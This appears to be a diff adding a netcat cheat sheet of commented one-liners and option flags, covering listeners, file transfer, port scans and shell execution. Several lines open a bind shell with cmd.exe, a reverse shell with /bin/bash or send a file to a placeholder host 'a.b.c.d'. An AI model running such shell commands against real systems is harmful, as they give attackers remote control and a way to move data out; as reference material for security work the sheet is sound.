@@ -1,0 +1,25 @@
+nc -nlvp 444 #enable netcat to listen to port 444
+nc -nv #client mode
+nc -nvlp 444 > incomingfile.txt #accept incoming file on port 444 and save as incomingfile.txt
+nc -nv a.b.c.d 444 < incomingfile.txt #send incomingfile.txt to a.b.c.d via port 444
+nc -nvlp 444 -e cmd.exe #accept incoming connections to cmd.exe via port 444
+nc -nv a.b.c.d 444 #connect to a.b.c.d's cmd.exe via port 444
+nc -nv a.b.c.d 444 -e /bin/bash #connect bash shell to a.b.c.d server listening on port 444 (reverse shell)
+nc -nvv -w 1 -z a.b.c.d 3385-3395 #scan a.b.c.d ports between 3385 and 3395 
+nc -unvv -w 1 -z a.b.c.d 160-165 #udp scan on a.b.c.d ports 160 to 165 (UDP port scan)
+
+nc -c string #specify shell commands to exec after connect (use with caution).  
+nc -e filename  #specify filename to exec after connect (use with caution). 
+
+nc -g gateway   #source-routing hop point[s], up to 8
+nc -G num       #source-routing pointer: 4, 8, 12, ...
+nc -h           #display help
+nc -i secs      #delay interval for lines sent, ports scanned
+nc -l           #listen mode, for inbound connects
+nc -n           #numeric-only IP addresses, no DNS
+nc -o file      #hex dump of traffic
+nc -p port      #local port number (port numbers can be individual or ranges: lo-hi [inclusive])
+nc -q seconds   #after EOF on stdin, wait the specified number of seconds and then quit. If seconds is negative, wait forever.
+nc -b           #allow UDP broadcasts
+nc -r           #randomize local and remote ports
+nc -u           #udp scan
